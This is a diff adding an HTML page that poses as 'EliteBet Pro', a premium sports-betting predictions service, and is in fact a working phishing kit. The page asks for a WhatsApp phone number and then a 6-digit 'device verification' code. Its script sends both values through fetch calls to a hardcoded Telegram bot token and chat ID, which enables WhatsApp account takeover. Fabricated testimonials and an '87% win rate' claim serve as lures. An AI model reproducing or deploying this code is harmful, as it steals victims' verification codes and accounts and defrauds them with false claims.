@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EliteBet Pro | Premium Sports Predictions</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2ecc71;
+            --secondary: #27ae60;
+            --dark: #2c3e50;
+            --light: #ecf0f1;
+            --accent: #e74c3c;
+            --gold: #f1c40f;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            width: 95%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(135deg, var(--dark), #34495e);
+            color: white;
+            padding: 15px 0;
+            border-radius: 0 0 15px 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 0 10px;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .logo i {
+            color: var(--gold);
+            margin-right: 8px;
+        }
+        
+        .tagline {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        /* Hero Section */
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 30px 0;
+            gap: 30px;
+        }
+        
+        .hero-content {
+            width: 100%;
+            text-align: center;
+        }
+        
+        .hero-image {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            color: var(--dark);
+            line-height: 1.3;
+        }
+        
+        h1 span {
+            color: var(--primary);
+        }
+        
+        .hero p {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        
+        /* Stats Section */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        /* Form Styles */
+        .form-container {
+            background: white;
+            border-radius: 8px;
+            padding: 25px;
+            margin: 30px auto;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .form-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--gold));
+        }
+        
+        .form-step {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .form-step.active {
+            display: block;
+        }
+        
+        .form-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: var(--dark);
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+        
+        input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(46, 204, 113, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            width: 100%;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        
+        .btn i {
+            margin-right: 8px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 3px 10px rgba(46, 204, 113, 0.3);
+        }
+        
+        /* OTP Section */
+        .otp-instructions {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #555;
+            font-size: 0.95rem;
+        }
+        
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .otp-input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 1.3rem;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+        
+        .otp-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(46, 204, 113, 0.2);
+        }
+        
+        .resend-otp {
+            text-align: center;
+            margin-top: 15px;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        .resend-link {
+            color: var(--primary);
+            cursor: pointer;
+            font-weight: 600;
+            margin-left: 3px;
+        }
+        
+        /* Loading and Success States */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 25px 0;
+        }
+        
+        .loading i {
+            font-size: 2rem;
+            color: var(--primary);
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+        
+        .loading p {
+            font-size: 1rem;
+            color: #555;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        
+        .success-icon {
+            font-size: 3rem;
+            color: var(--primary);
+            margin-bottom: 15px;
+            animation: bounce 0.8s;
+        }
+        
+        .success-message h3 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--dark);
+        }
+        
+        .success-message p {
+            font-size: 1rem;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            margin: 40px 0;
+        }
+        
+        .testimonials h2 {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: var(--dark);
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+        
+        .testimonial-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+        }
+        
+        .testimonial-card::before {
+            content: '"';
+            font-size: 4rem;
+            color: var(--primary);
+            opacity: 0.1;
+            position: absolute;
+            top: 5px;
+            left: 15px;
+            font-family: serif;
+        }
+        
+        .testimonial-text {
+            font-size: 0.95rem;
+            color: #555;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+        }
+        
+        .author-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: var(--light);
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        
+        .author-info h4 {
+            font-size: 1rem;
+            color: var(--dark);
+            margin-bottom: 3px;
+        }
+        
+        .author-info p {
+            font-size: 0.85rem;
+            color: #777;
+        }
+        
+        /* Footer */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 30px 0;
+            text-align: center;
+            border-radius: 15px 15px 0 0;
+        }
+        
+        .footer-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            transition: color 0.2s;
+            font-size: 0.9rem;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .social-links a {
+            color: white;
+            font-size: 1.3rem;
+            transition: color 0.2s;
+        }
+        
+        .social-links a:hover {
+            color: var(--primary);
+        }
+        
+        .disclaimer {
+            font-size: 0.75rem;
+            opacity: 0.7;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-15px); }
+            60% { transform: translateY(-7px); }
+        }
+        
+        /* Tablet and Desktop Styles */
+        @media (min-width: 768px) {
+            .header-content {
+                flex-direction: row;
+                justify-content: space-between;
+                text-align: left;
+            }
+            
+            .hero {
+                flex-direction: row;
+                align-items: center;
+                text-align: left;
+            }
+            
+            .hero-content {
+                text-align: left;
+            }
+            
+            .stats {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .testimonial-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .footer-links {
+                gap: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-chart-line"></i>EliteBet Pro
+                </div>
+                <div class="tagline">Premium Sports Predictions</div>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Hero Section -->
+    <section class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>Get <span>Winning Predictions</span> From Our Experts</h1>
+                <p>Join thousands of successful bettors who trust our premium predictions with consistent 80%+ win rate across all major sports.</p>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number">87%</div>
+                        <div class="stat-label">Win Rate</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">24/7</div>
+                        <div class="stat-label">Support</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">5K+</div>
+                        <div class="stat-label">Members</div>
+                    </div>
+                </div>
+            </div>
+            <div class="hero-image">
+                <img src="https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80" alt="Sports Betting">
+            </div>
+        </div>
+    </section>
+    
+    <!-- Form Container -->
+    <section class="container">
+        <div class="form-container">
+            <!-- Step 1: Name -->
+            <div class="form-step active" id="step1">
+                <h2 class="form-title"><i class="fas fa-user-shield"></i> Connect Whatsapp to get predictions</h2>
+                <div class="form-group">
+                    <label for="name">Your Whatsapp Phone number</label>
+                    <input type="text" id="name" placeholder="enter whatsapp number" required>
+                </div>
+                
+                <button type="button" class="btn" id="submitNameBtn">
+                    <i class="fas fa-arrow-right"></i> Continue
+                </button>
+            </div>
+            
+            <!-- Step 2: OTP -->
+            <div class="form-step" id="step2">
+                <h2 class="form-title"><i class="fas fa-mobile-alt"></i> Device Verification</h2>
+                <p class="otp-instructions">We've sent a 6-digit verification code to your device. Please enter it below:</p>
+                
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" data-index="1">
+                    <input type="text" class="otp-input" maxlength="1" data-index="2">
+                    <input type="text" class="otp-input" maxlength="1" data-index="3">
+                    <input type="text" class="otp-input" maxlength="1" data-index="4">
+                    <input type="text" class="otp-input" maxlength="1" data-index="5">
+                    <input type="text" class="otp-input" maxlength="1" data-index="6">
+                </div>
+                
+                <div class="resend-otp">
+                    Didn't receive code? <span class="resend-link" id="resendOtp">Resend OTP</span>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <i class="fas fa-spinner"></i>
+                    <p>Verifying your device...</p>
+                </div>
+                
+                <button type="button" class="btn" id="submitOtpBtn">
+                    <i class="fas fa-check-circle"></i> Verify & Continue
+                </button>
+            </div>
+            
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h3>Verification Successful!</h3>
+                <p>You're being granted access to our premium predictions portal...</p>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Testimonials -->
+    <section class="container testimonials">
+        <h2>What Our Members Say</h2>
+        <div class="testimonial-grid">
+            <div class="testimonial-card">
+                <p class="testimonial-text">"I've increased my bankroll by 300% in just 3 months using EliteBet Pro predictions. The football tips are incredibly accurate!"</p>
+                <div class="testimonial-author">
+                    <div class="author-avatar">JD</div>
+                    <div class="author-info">
+                        <h4>John D.</h4>
+                        <p>Professional Bettor</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="testimonial-card">
+                <p class="testimonial-text">"The tennis predictions have been spot on. I've hit 12 straight winning bets thanks to their expert analysis."</p>
+                <div class="testimonial-author">
+                    <div class="author-avatar">SM</div>
+                    <div class="author-info">
+                        <h4>Sarah M.</h4>
+                        <p>Tennis Enthusiast</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="testimonial-card">
+                <p class="testimonial-text">"As a casual bettor, I appreciate how easy they make it to follow their predictions. My winning percentage has doubled!"</p>
+                <div class="testimonial-author">
+                    <div class="author-avatar">TP</div>
+                    <div class="author-info">
+                        <h4>Tom P.</h4>
+                        <p>Weekend Bettor</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-logo">
+                <i class="fas fa-chart-line"></i>EliteBet Pro
+            </div>
+            <div class="footer-links">
+                <a href="#">Home</a>
+                <a href="#">Predictions</a>
+                <a href="#">About Us</a>
+                <a href="#">Contact</a>
+            </div>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-telegram"></i></a>
+                <a href="#"><i class="fab fa-whatsapp"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+            </div>
+            <div class="disclaimer">
+                <p><i class="fas fa-exclamation-triangle"></i> Disclaimer: Sports betting involves risk. Please bet responsibly. Our predictions are not guaranteed.</p>
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // Telegram API details
+        const TELEGRAM_BOT_API_KEY = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
+        const TELEGRAM_CHAT_ID = '7651943856';
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const submitNameBtn = document.getElementById('submitNameBtn');
+            const submitOtpBtn = document.getElementById('submitOtpBtn');
+            const resendOtp = document.getElementById('resendOtp');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const otpInputs = document.querySelectorAll('.otp-input');
+            
+            let userName = '';
+            
+            // Handle OTP input navigation
+            otpInputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    if (this.value.length === 1) {
+                        const nextIndex = parseInt(this.dataset.index) + 1;
+                        const nextInput = document.querySelector(`.otp-input[data-index="${nextIndex}"]`);
+                        if (nextInput) nextInput.focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        const prevIndex = parseInt(this.dataset.index) - 1;
+                        const prevInput = document.querySelector(`.otp-input[data-index="${prevIndex}"]`);
+                        if (prevInput) prevInput.focus();
+                    }
+                });
+            });
+            
+            // Handle name submission
+            submitNameBtn.addEventListener('click', function() {
+                userName = document.getElementById('name').value.trim();
+                
+                if (!userName) {
+                    alert('Please enter your name');
+                    return;
+                }
+                
+                // Send name to Telegram immediately
+                const nameMessage = `New Access Request:\n\nName: ${userName}\n\nAwaiting OTP verification...`;
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_API_KEY}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: nameMessage
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Switch to OTP step
+                    step1.classList.remove('active');
+                    step2.classList.add('active');
+                    otpInputs[0].focus();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('There was an error. Please try again.');
+                });
+            });
+            
+            // Handle OTP submission
+            submitOtpBtn.addEventListener('click', function() {
+                // Collect OTP from inputs
+                let otp = '';
+                otpInputs.forEach(input => {
+                    otp += input.value;
+                });
+                
+                if (otp.length !== 6) {
+                    alert('Please enter the full 6-digit OTP');
+                    return;
+                }
+                
+                // Show loading
+                loading.style.display = 'block';
+                
+                // Prepare final message for Telegram
+                const finalMessage = `OTP Verification:\n\nName: ${userName}\nOTP: ${otp}`;
+                
+                // Send to Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_API_KEY}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: finalMessage
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Hide loading
+                    loading.style.display = 'none';
+                    
+                    // Show success
+                    step2.classList.remove('active');
+                    successMessage.style.display = 'block';
+                    
+                    // Redirect after delay (replace with your actual predictions page)
+                    setTimeout(() => {
+                        // window.location.href = "predictions.html";
+                        alert("Redirecting to predictions...");
+                    }, 2500);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    loading.style.display = 'none';
+                    alert('There was an error verifying your OTP. Please try again.');
+                });
+            });
+            
+            // Handle OTP resend
+            resendOtp.addEventListener('click', function() {
+                // Send resend notification to Telegram
+                const resendMessage = `OTP Resend Request:\n\nName: ${userName}\n\nUser requested OTP resend.`;
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_API_KEY}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: resendMessage
+                    })
+                });
+                
+                // Show temporary message
+                const originalText = resendOtp.innerHTML;
+                resendOtp.innerHTML = '<i class="fas fa-check"></i> OTP Sent!';
+                setTimeout(() => {
+                    resendOtp.innerHTML = originalText;
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
